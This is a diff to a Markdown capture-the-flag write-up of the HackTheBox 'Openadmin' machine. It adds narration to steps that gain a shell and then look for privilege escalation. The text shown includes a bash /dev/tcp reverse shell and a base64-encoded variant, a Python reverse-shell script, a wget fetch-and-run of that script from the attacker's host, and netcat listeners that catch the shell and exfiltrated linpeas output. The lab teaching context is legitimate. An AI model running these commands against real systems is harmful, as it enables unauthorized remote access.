@@ -1,7 +1,7 @@
 ---
 title: "HackTheBox - Openadmin"
 author: ["jurgen.kobierczynski@telenet.be", ""]
-date: "2021-01-10"
+date: "2021-03-24"
 subject: "Markdown"
 keywords: [Markdown, Example]
 subtitle: "Openadmin"
@@ -210,7 +210,7 @@ drwxrwxr-x  2 www-data www-data 4096 Jan  3  2018 winc
 drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 workspace_plugins
 ```
 
-This exploit provide us however with a stateless shell. Every command we issued is not remembered and we end up in the same directory:
+This exploit provide us however with a stateless shell. Every command we issued is not remembered and we end up in the same directory, we can find 2 users:
 
 ```
 $ cd /home
@@ -238,9 +238,13 @@ drwxr-x--- 5 jimmy  jimmy  4096 Nov 22  2019 jimmy
 drwxr-x--- 6 joanna joanna 4096 Nov 28  2019 joanna
 ```
 
+Also we cannot execute any normal reverse shell command as any special character is interpreted as html tags:
+
 ```
 $ bash -i >& /dev/tcp/10.10.14.4/4444 0>&1                                                                                        $ echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzQ0NDQgMD4mMQo= | base64 -d | bash
 ```
+
+To make things easier, we create a python reverse shell script in a upload directory:
 
 ```
 $ cat reverse.py
@@ -252,17 +256,24 @@ s.connect(("10.10.14.4",4444))
 pty.spawn("/bin/sh")
 ```
 
+We setup a webserver to retrieve this reverse.py script:
+
 ```
 $ python3 -m http.server 8000
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.10.10.171 - - [24/Mar/2021 13:11:17] "GET /reverse.py HTTP/1.1" 200 -
 ```
 
+We download the reverse.py script on the openadmin box:
+
 ```
+$ cd /dev/shm
 $ wget http://10.10.14.4:8000/reverse.py
 $ chmod +x reverse.py
 $ python3 reverse.py
 ```
+
+We open a Netcat on port 4444 on our box to capture the reverse shell:
 
 ```
 $ nc -lnvp 4444
@@ -270,6 +281,8 @@ listening on [any] 4444 ...
 connect to [10.10.14.4] from (UNKNOWN) [10.10.10.171] 47316
 $ 
 ```
+
+Now we are logged in, and download Linpeas and check the box for privilege escalation paths:
 
 ```
 $ cd /dev/shm
@@ -305,6 +318,8 @@ $ nc -lnvp 6666 > linpeas.out
 listening on [any] 6666 ...
 connect to [10.10.14.4] from (UNKNOWN) [10.10.10.171] 35250
 ```
+
+In the linpeas we find references to the /var/www directory, we check the files:
 
 ```
 $ ls
